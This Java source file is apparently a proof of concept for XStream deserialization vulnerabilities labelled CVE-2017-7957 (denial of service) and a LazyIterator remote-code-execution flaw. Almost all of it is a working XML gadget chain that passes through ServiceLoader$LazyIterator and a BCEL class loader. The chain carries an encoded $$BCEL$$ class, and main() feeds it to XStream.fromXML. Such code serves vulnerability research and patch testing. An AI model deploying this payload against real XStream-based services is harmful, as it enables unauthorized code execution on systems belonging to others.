package org.example;

import com.thoughtworks.xstream.XStream;
//import com.thoughtworks.xstream.security.AnyTypePermission;

/**
 * DOS <= 1.4.9
 * RCE LazyIterator <1.4.10
 */
public class CVE_2017_7957 {
    public static void main(String[] args) {
        String xml = "<string class='void'>Hello, world!</string>";


        String xml2 = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n" +
                "        <dataHandler>\n" +
                "          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n" +
                "            <is class=\"javax.crypto.CipherInputStream\">\n" +
                "              <cipher class=\"javax.crypto.NullCipher\">\n" +
                "                <initialized>false</initialized>\n" +
                "                <opmode>0</opmode>\n" +
                "                <serviceIterator class=\"java.util.ServiceLoader$LazyIterator\">\n" +
                "                  <service>java.lang.Object</service>\n" +
                "                  <loader class=\"com.sun.org.apache.bcel.internal.util.ClassLoader\">\n" +
                "                    <package2certs class=\"hashtable\"/>\n" +
                "                    <classes defined-in=\"java.lang.ClassLoader\"/>\n" +
                "                    <defaultDomain>\n" +
                "                      <principals/>\n" +
                "                      <hasAllPerm>false</hasAllPerm>\n" +
                "                      <staticPermissions>false</staticPermissions>\n" +
                "                      <key/>\n" +
                "                    </defaultDomain>\n" +
                "                    <domains/>\n" +
                "                    <packages/>\n" +
                "                    <nativeLibraries/>\n" +
                "                    <defaultAssertionStatus>false</defaultAssertionStatus>\n" +
                "                    <classes>\n" +
                "                      <entry>\n" +
                "                        <string>java.lang.Object</string>\n" +
                "                        <java-class>java.lang.Object</java-class>\n" +
                "                      </entry>\n" +
                "                      <entry>\n" +
                "                        <string>java.lang.Runtime</string>\n" +
                "                        <java-class>java.lang.Runtime</java-class>\n" +
                "                      </entry>\n" +
                "                    </classes>\n" +
                "                    <ignored__packages/>\n" +
                "                    <repository class=\"com.sun.org.apache.bcel.internal.util.SyntheticRepository\">\n" +
                "                      <__path>\n" +
                "                        <paths/>\n" +
                "                        <class__path></class__path>\n" +
                "                      </__path>\n" +
                "                      <__loadedClasses/>\n" +
                "                    </repository>\n" +
                "                  </loader>\n" +
                "                  <nextName>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$cbJ$c3$40$U$86$ff$d3$d4$a6$8d$a9$f6b$ab$ee$ea$caT$b0$a5$e0B$a8$b8$v$b8$b2$uFt$3d$j$87$90$g$93$90L$c47r$ddM$V$X$3e$80$P$a5$9e$R$c1$823$f0$P$e7$f0$cd7$97$8f$cf$b7w$AG$d8$r$94$f3btl$83$I$8d$b9x$U$c3H$c4$c1$f0b6WR$db$b0$I$8e$9f$U$99Tga$a4$I5$D$P$MG$a8$9c$84q$a8O$J$96$d7$bfqa$a3$ea$a0$8c$g$h$t$c9$j$b3$cd$3f$ddU$R$eb$f0A$d9p$d9$X$u$fd$5b$T$3a$5e$ff$fc$l6v$b1$81M$Hu4$I$dd$qUq$efP$f4$s$o$92E$qt$92$ND$9aV$d1$e2$83$d4$93$92$84$7do$c5$e1$eb$y$8c$83$f1$aa$f62K$a4$cas$d6n$a1c$b4$5dB$dd$d7B$deOEz$zf$91$c2$kJ$7cw3$88$t$3f$85s$9d$ab$Rw$z$5e$db$H$_p$9e$f9$3b$a6$afh$b6$daKl$df$$$7e$e0$jN$X$f4$c5$7b$c8f$89$e9$adq$96P$f9$G$5d$404$a6e$B$A$A</nextName>\n" +
                "                  <outer-class/>\n" +
                "                </serviceIterator>\n" +
                "                <lock/>\n" +
                "              </cipher>\n" +
                "              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n" +
                "              <ibuffer></ibuffer>\n" +
                "              <done>false</done>\n" +
                "              <ostart>0</ostart>\n" +
                "              <ofinish>0</ofinish>\n" +
                "              <closed>false</closed>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "</map>";




        XStream xstream = new XStream();
//        xstream.addPermission(AnyTypePermission.ANY);
        xstream.fromXML(xml2);
    }

}
